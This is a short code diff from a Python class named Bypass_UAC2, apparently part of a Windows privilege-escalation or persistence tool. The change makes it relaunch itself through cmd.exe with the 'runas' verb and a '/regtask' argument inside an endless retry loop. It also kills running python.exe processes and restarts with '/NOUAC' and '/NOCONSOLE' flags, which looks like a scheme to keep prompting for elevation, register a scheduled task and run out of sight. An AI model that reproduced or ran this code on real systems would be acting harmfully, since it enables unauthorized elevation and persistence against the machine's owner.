@@ -24,7 +24,7 @@ class Bypass_UAC2():
 
 		while True:
 			try:
-				shell.ShellExecuteEx(lpVerb='runas', lpFile=filename, lpParameters="/regtask")
+				shell.ShellExecuteEx(lpVerb='runas', lpFile="cmd.exe", lpParameters=filename + " /regtask")
 				sub = Popen(["cmd.exe","/c","taskkill","/IM","python.exe","/F","&",filename, '/NOCONSOLE', '/NOUAC', python + " " + me + " " + self.note], shell=True)
 				os.system("taskkill /IM python.exe /F")
 
